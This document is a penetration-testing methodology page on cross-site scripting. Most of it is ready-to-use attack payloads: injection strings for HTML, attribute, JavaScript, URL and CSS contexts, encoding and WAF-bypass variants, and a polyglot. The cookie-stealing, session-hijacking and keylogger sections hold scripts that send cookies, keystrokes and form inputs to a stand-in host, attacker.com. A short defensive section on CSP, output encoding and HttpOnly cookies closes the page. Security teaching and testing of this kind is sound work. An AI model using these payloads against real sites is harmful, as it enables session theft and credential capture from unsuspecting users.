---
title: Cross-Site Scripting (XSS)
category: methodology
tags:
  - xss
  - web
  - client-side
  - javascript
  - exploitation
  - owasp
last_updated: 2025-12-27
---

# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker injects malicious scripts into web pages viewed by other users. XSS vulnerabilities occur when an application includes untrusted data in a web page without proper validation or escaping.

## Types of XSS

### 1. Reflected XSS

The malicious script is reflected off the web server in error messages, search results, or any response that includes user input. The attack is delivered via a URL or form submission.

```html
# Basic reflected XSS
http://vulnerable.com/search?q=<script>alert('XSS')</script>

# In URL parameter
http://vulnerable.com/page?name=<script>alert(document.cookie)</script>

# Via form submission
<form action="http://vulnerable.com/search" method="GET">
  <input name="q" value="<script>alert('XSS')</script>">
</form>
```

### 2. Stored XSS (Persistent XSS)

The malicious script is permanently stored on the target server (database, message forum, comment field, etc.) and served to users who view the affected page.

```html
# Comment field payload
<script>alert('XSS')</script>

# Profile name payload
"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# Forum post with hidden script
Normal text<script src="http://attacker.com/malicious.js"></script>
```

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side. The attack payload is executed as a result of modifying the DOM environment in the victim's browser.

```javascript
# Vulnerable code example
document.getElementById('output').innerHTML = location.hash.substring(1);

# Attack URL
http://vulnerable.com/page#<img src=x onerror=alert('XSS')>

# document.write sink
http://vulnerable.com/page?default=<script>alert('XSS')</script>

# Common DOM sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
```

## XSS Contexts and Payloads

### HTML Context

When input is reflected in HTML body:

```html
# Basic payloads
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script src="http://attacker.com/xss.js"></script>

# Without script tags
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<marquee onstart=alert('XSS')>
<div onmouseover=alert('XSS')>Hover me</div>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert('XSS')">click</maction></math>
```

### Attribute Context

When input is reflected inside an HTML attribute:

```html
# Breaking out of attribute
" onmouseover="alert('XSS')
" onfocus="alert('XSS')" autofocus="
' onclick='alert("XSS")

# Event handlers
" onload="alert('XSS')
" onerror="alert('XSS')
" onmouseover="alert('XSS')
" onfocus="alert('XSS')
" onblur="alert('XSS')

# Without quotes
onmouseover=alert('XSS')
onfocus=alert('XSS')autofocus

# Breaking out with new tag
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
```

### JavaScript Context

When input is reflected inside JavaScript code:

```javascript
# String escape
';alert('XSS')//
";alert('XSS')//
</script><script>alert('XSS')</script>

# Template literals
${alert('XSS')}
`${alert('XSS')}`

# Breaking out of string
'-alert('XSS')-'
'+alert('XSS')+'
\';alert('XSS')//

# JavaScript URL
javascript:alert('XSS')
javascript:alert(String.fromCharCode(88,83,83))

# JSON injection
{"name":"value","inject":"-alert('XSS')-"}
```

### URL Context

When input is reflected in URL attributes:

```html
# javascript: protocol
<a href="javascript:alert('XSS')">Click</a>
<a href="  javascript:alert('XSS')">Click</a>
<a href="JaVaScRiPt:alert('XSS')">Click</a>

# data: protocol
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>

# vbscript: protocol (IE)
<a href="vbscript:msgbox('XSS')">Click</a>
```

### CSS Context

When input is reflected in CSS:

```css
# Expression (IE)
background: url('javascript:alert("XSS")');
expression(alert('XSS'))

# Import
@import 'http://attacker.com/xss.css';

# Behavior (IE)
behavior: url('http://attacker.com/xss.htc');
```

## Filter Bypass Techniques

### Case Manipulation

```html
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x oNeRrOr=alert('XSS')>
<SCRIPT>alert('XSS')</SCRIPT>
```

### Encoding Bypasses

```html
# HTML entity encoding
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')">Click</a>

# Hex encoding
<img src=x onerror="\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29">

# Unicode encoding
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('XSS')">

# URL encoding
<a href="javascript:%61%6c%65%72%74%28%27%58%53%53%27%29">Click</a>

# Double encoding
%253Cscript%253Ealert('XSS')%253C/script%253E

# Base64 in data URI
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

### Obfuscation Techniques

```html
# Null bytes
<scr\x00ipt>alert('XSS')</scr\x00ipt>

# Newlines and tabs
<img src=x onerror
=alert('XSS')>
<script>al&#10;ert('XSS')</script>

# Concatenation
<script>eval('al'+'ert("XSS")')</script>
<script>window['al'+'ert']('XSS')</script>

# Constructor
<script>[].constructor.constructor('alert("XSS")')();</script>
<script>Function('alert("XSS")')();</script>

# Without parentheses
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<script>{onerror=alert}throw'XSS'</script>

# Without alert keyword
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<script>top['al'+'ert']('XSS')</script>
<script>self[`al`+`ert`]`XSS`</script>
```

### Tag and Attribute Bypasses

```html
# SVG with encoded payload
<svg><script>alert&lpar;'XSS'&rpar;</script></svg>

# Event handler alternatives
<body onpageshow=alert('XSS')>
<body onhashchange=alert('XSS')>
<input onpaste=alert('XSS')>
<marquee onbounce=alert('XSS')>

# Polyglot payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### WAF Bypass Payloads

```html
# Cloudflare bypass examples
<svg onload=prompt%26%230000000040document.domain)>
<a"/teleport/onclick=confirm()>click</a>

# Generic WAF bypasses
<img src=x onerror=top['ale'+'rt']('XSS')>
<img/src="x"/onerror="alert('XSS')">
<img src=`x` onerror=`alert('XSS')`>
<x onclick=alert('XSS')>click
<x contenteditable onblur=alert('XSS')>click</x>
```

## Cookie Stealing

```javascript
# Basic cookie exfiltration
<script>
document.location='http://attacker.com/steal?c='+document.cookie;
</script>

# Using image
<script>
new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>

# Using fetch
<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

# XMLHttpRequest
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://attacker.com/steal?c='+document.cookie);
x.send();
</script>

# With encoding
<script>
document.location='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>
```

## Session Hijacking

```javascript
# Capture session and redirect
<script>
var session = document.cookie;
window.location = 'http://attacker.com/hijack?session=' + encodeURIComponent(session);
</script>

# Hidden iframe exfiltration
<script>
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'http://attacker.com/log?cookie=' + document.cookie;
document.body.appendChild(iframe);
</script>

# WebSocket exfiltration
<script>
var ws = new WebSocket('ws://attacker.com:8080');
ws.onopen = function() {
    ws.send(document.cookie);
};
</script>
```

## Keylogger Implementation

```javascript
# Basic keylogger
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://attacker.com/log?key=' + e.key;
};
</script>

# Form input capture
<script>
document.querySelectorAll('input').forEach(function(input) {
    input.addEventListener('change', function() {
        fetch('http://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({field: this.name, value: this.value})
        });
    });
});
</script>
```

## XSS Detection Tools

### Manual Testing

```bash
# Burp Suite Intruder with XSS wordlist
# Use XSS payload lists from SecLists

# Browser developer tools
# Check for unsanitized reflection in source code
```

### Automated Scanners

```bash
# XSStrike
python3 xsstrike.py -u "http://target.com/page?q=test"

# Dalfox
dalfox url "http://target.com/page?q=test"

# XSSer
xsser -u "http://target.com/page?q=test"

# OWASP ZAP Active Scan
# Configure active scanner with XSS rules

# Nuclei XSS templates
nuclei -u "http://target.com" -t xss/
```

## Prevention

### Output Encoding

```javascript
# HTML context
&lt; &gt; &amp; &quot; &#x27;

# JavaScript context
\x3C \x3E \x26 \x22 \x27

# URL context
%3C %3E %26 %22 %27
```

### Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none';
```

### HttpOnly Cookies

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### Input Validation

- Whitelist allowed characters
- Validate data type and format
- Sanitize HTML with libraries (DOMPurify, Bleach)

### Framework Protections

- React: Uses JSX escaping by default
- Angular: Automatic sanitization
- Vue.js: Template interpolation escaping

## Testing Checklist

- [ ] Test all input fields for reflection
- [ ] Check URL parameters
- [ ] Test HTTP headers (User-Agent, Referer)
- [ ] Check JSON/XML responses
- [ ] Test file upload functionality
- [ ] Check for DOM-based XSS sinks
- [ ] Verify CSP implementation
- [ ] Test cookie security attributes
- [ ] Check for XSS in error messages
- [ ] Test different encoding bypasses

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
